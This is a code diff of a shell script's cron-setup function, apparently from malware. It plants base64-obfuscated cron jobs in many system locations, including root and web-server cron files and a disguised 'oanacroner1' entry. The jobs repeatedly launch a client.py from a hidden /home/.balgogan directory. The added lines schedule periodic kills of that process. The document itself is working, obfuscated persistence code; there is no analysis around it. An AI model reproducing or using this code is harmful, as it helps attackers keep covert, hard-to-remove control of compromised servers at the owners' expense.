@@ -17,12 +17,19 @@ lock(){
 makecron(){
     unlock
     echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" | crontab -
+    echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" | crontab -
     echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" > /etc/cron.d/root
+    echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" >> /etc/cron.d/root
     echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" > /etc/cron.d/apache
+    echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" >> /etc/cron.d/apache
     echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" > /etc/cron.d/nginx
+    echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" >> /etc/cron.d/nginx
     echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" > /var/spool/cron/root
+    echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" >> /var/spool/cron/root
     echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" > /var/spool/cron/crontabs/root
+    echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" >> /var/spool/cron/crontabs/root
     echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" > /etc/cron.hourly/oanacroner1
+    echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" >> /etc/cron.hourly/oanacroner1
     lock
 }
 
